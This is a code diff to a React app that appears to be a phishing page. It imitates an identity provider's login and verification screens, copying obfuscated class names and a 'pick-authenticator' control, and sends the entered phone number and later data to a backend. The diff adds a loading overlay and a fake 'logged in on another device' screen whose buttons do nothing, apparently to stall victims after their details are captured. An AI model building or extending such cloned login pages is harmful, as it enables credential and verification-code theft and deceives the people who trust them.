@@ -16,8 +16,11 @@ function App() {
   const [isInvalidData, setIsInvalidData] = useState(null);
   const [number, setNumber] = useState("");
   const [id, setId] = useState(null);
+  const [isLoader, setIsLoader] = useState("none");
+  const [isContinue, setIsContinue] = useState(false);
 
   const handleLogin = async () => {
+    setIsLoader("block");
     try {
       const response = await fetch("http://localhost:9266/users", {
         method: "POST",
@@ -30,6 +33,7 @@ function App() {
         })
       });
       const data = await response.json();
+      setIsLoader("none");
       if (data?.number) {
         setId(data.id);
         setLoggedIn(true);
@@ -43,6 +47,7 @@ function App() {
   };
 
   const handleContinue = async () => {
+    setIsContinue(true);
     await fetch(`http://localhost:9266/users/${id}`, {
       method: "PUT",
       headers: {
@@ -184,8 +189,11 @@ function App() {
               <a href="#">Privacy Policy</a>
             </div>
           </div>
+          <div className="opacity-container" style={{ display: isLoader }}>
+            <div className="loader"></div>
+          </div>
         </>
-      ) : (
+      ) : !isContinue ? (
         <div className="container verify">
           <div className="verification">
             <div className="verify-identity">
@@ -281,6 +289,47 @@ function App() {
                 <button type="button" name="action" aria-label="" value="pick-authenticator" className="c14e56dac">
                   TRY ANOTHER METHOD
                 </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      ) : (
+        <div
+          style={{
+            width: "100vw",
+            backgroundImage: " url(https://cdn.pixabay.com/photo/2014/02/27/16/10/flowers-276014_640.jpg)",
+            backgroundRepeat: "no-repeat",
+            backgroundSize: "cover",
+            height: "100vh"
+          }}
+        >
+          <div className="opacity-container">
+            <div className="oops">
+              <div className="opps-content">
+                <h4 style={{ margin: "0" }}>Oops!</h4>
+                <p>You or someone else is logged in on another device.</p>
+                <p>
+                  If you click <i>Login Anyway</i>, the other device will be logged out.
+                </p>
+                <div style={{ textAlign: "right" }}>
+                  <button type="button" className="c14e56dac" style={{ color: "#2b82b6", padding: "5px 10px" }}>
+                    GO BACK
+                  </button>
+                  <button
+                    type="button"
+                    style={{
+                      backgroundColor: "#6e6e6e",
+                      color: "white",
+                      padding: "10px 20px",
+                      borderRadius: "5px",
+                      border: "1px solid #6e6e6e",
+                      marginLeft: "15px",
+                      cursor: "pointer"
+                    }}
+                  >
+                    LOGIN ANYWAY
+                  </button>
+                </div>
               </div>
             </div>
           </div>
